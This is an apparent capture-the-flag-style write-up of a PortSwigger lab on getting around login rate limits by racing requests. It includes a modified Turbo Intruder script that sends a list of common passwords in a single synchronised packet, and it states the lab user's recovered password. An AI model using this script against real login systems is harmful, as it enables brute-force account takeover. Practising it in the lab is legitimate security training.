# Bypassing rate limits via race conditions

In this lab portswigger suggest to use **Turbo Intruder** with is extensions you can download 

At first catch request and send it to reaper

<img width="960" height="924" alt="image" src="https://github.com/user-attachments/assets/13d512a4-1249-403e-9cb5-ab24f39bcb04" />

After that select password right click and send it to turbo intruder

In turbo intruder sellect race-single-packet-attack.py

<img width="1267" height="790" alt="image" src="https://github.com/user-attachments/assets/2b2a911e-892b-44e4-8b30-d8d7d50b4a8a" />

You need to update code add array with password and change loop

```
def queueRequests(target, wordlists):

    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    passwords = ['123123', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master', '666666', 'qwertyuiop', '123321', 'mustang', '123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', '1234567890', 'michael', 'x654321', 'superman', '1qaz2wsx', 'baseball', '7777777', '121212', '000000']

    # the 'gate' argument withholds part of each request until openGate is invoked
    # if you see a negative timestamp, the server responded before the request was complete
    for password in passwords:
        engine.queue(target.req, password, gate='1')

    # once every 'race1' tagged request has been queued
    # invoke engine.openGate() to send them in sync
    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)
```

And like that we found that the password for carlos is master 

<img width="1277" height="762" alt="image" src="https://github.com/user-attachments/assets/a809215c-c87b-41af-a176-7e671cce5ccd" />
